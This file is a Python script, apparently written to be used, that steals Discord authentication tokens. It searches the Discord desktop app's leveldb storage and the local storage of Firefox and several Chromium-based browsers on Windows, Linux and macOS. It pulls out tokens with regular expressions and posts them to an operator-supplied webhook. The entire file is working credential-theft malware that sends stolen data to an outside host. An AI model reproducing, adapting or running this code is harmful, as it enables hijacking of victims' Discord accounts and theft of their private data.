import os
import re
import sqlite3
import glob
import platform
import getpass
import requests
import argparse
from pathlib import Path

TOKEN_REGEX = re.compile(r"(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27})")

def get_token_from_discord_app():
    app_data = f"C:/Users/{os.getlogin()}/AppData/Roaming/discord/Local Storage/leveldb"
    ldb_files = glob.glob(os.path.join(app_data, "*.ldb")) + glob.glob(os.path.join(app_data, "*.log"))

    tokens = []
    json_pattern = re.compile(r'{"(\d+)":"([^"]+)"}')  # Match {"prefix":"token"}

    for ldb_file in ldb_files:
        try:
            with open(ldb_file, "r", errors="ignore") as file:
                for i, line in enumerate(file):
                    matches = json_pattern.findall(line)
                    for prefix, token in matches:
                        tokens.append((prefix, token))
                        print(f"[+] Found Token:\n    Prefix: {prefix}\n    Token: {token}\n")
        except Exception as e:
            continue

    return tokens

tok = get_token_from_discord_app()

def extract_tokens_from_leveldb(file: Path):
    tokens = set()
    try:
        with open(file, "r", errors="ignore") as f:
            for line in f:
                tokens_found = TOKEN_REGEX.findall(line)
                for t in tokens_found:
                    tokens.add(t)
    except Exception as e:
        pass
    return list(tokens)

def extract_tokens_from_sqlite(db: Path):
    tokens = set()
    try:
        with sqlite3.connect(db) as conn:
            cursor = conn.execute("SELECT value FROM data")
            for (value,) in cursor:
                if isinstance(value, bytes):
                    value = value.decode("utf-8", errors="ignore")
                tokens_found = TOKEN_REGEX.findall(value)
                for t in tokens_found:
                    tokens.add(t)
    except Exception as e:
        pass
    return list(tokens)

def get_firefox_profiles():
    home = Path.home()
    profiles_path = None
    if platform.system() == "Windows":
        profiles_path = home / "AppData/Roaming/Mozilla/Firefox/Profiles"
    elif platform.system() == "Linux":
        profiles_path = home / ".mozilla/firefox"
    elif platform.system() == "Darwin":
        profiles_path = home / "Library/Application Support/Firefox/Profiles"
    else:
        return []

    if not profiles_path.exists():
        return []

    profiles = []
    for prof in profiles_path.glob("*.default*"):
        db_path = prof / "storage/default/https+++discord.com/ls/data.sqlite"
        if db_path.exists():
            profiles.append(db_path)
    return profiles

def get_chromium_profiles():
    home = Path.home()
    paths = []
    system = platform.system()
    local = None
    if system == "Windows":
        local = home / "AppData/Local"
    elif system == "Linux":
        local = home / ".config"
    elif system == "Darwin":
        local = home / "Library/Application Support"
    else:
        return []

    browsers = [
        "Google/Chrome/User Data",
        "BraveSoftware/Brave-Browser/User Data",
        "Microsoft/Edge/User Data",
        "Opera Software/Opera Stable",
        "Opera Software/Opera GX Stable",
        "Vivaldi/User Data",
        "Yandex/YandexBrowser/User Data/Default"
    ]

    for b in browsers:
        base = local / b
        if not base.exists():
            continue
        # Chercher dans les profils "Default" ou "Profile *"
        for profile_dir in base.glob("**/Local Storage/leveldb"):
            paths.extend(profile_dir.glob("*.ldb"))

    return paths

def main(webhook_url):
    tokens = set()

    # Firefox tokens
    for sqlite_db in get_firefox_profiles():
        tokens.update(extract_tokens_from_sqlite(sqlite_db))

    # Chromium tokens
    for ldb_file in get_chromium_profiles():
        tokens.update(extract_tokens_from_leveldb(ldb_file))

    tokens = list(tokens)

    # Envoi au webhook
    for token in tokens:
        try:
            print(f"Token found: {token}")
            print(webhook_url)
            res = requests.post(webhook_url, json={"content": f"file token from browser: {tokens}\nFrom discord app: {tok}"}, timeout=10)
            res.raise_for_status()
        except Exception as e:
            pass

if __name__ == "__main__":
    get_token_from_discord_app()
    parser = argparse.ArgumentParser(description="Extract and send Discord tokens to a webhook.")
    parser.add_argument("webhook", help="The webhook URL to send the tokens to.")
    args = parser.parse_args()
    
    main(args.webhook)
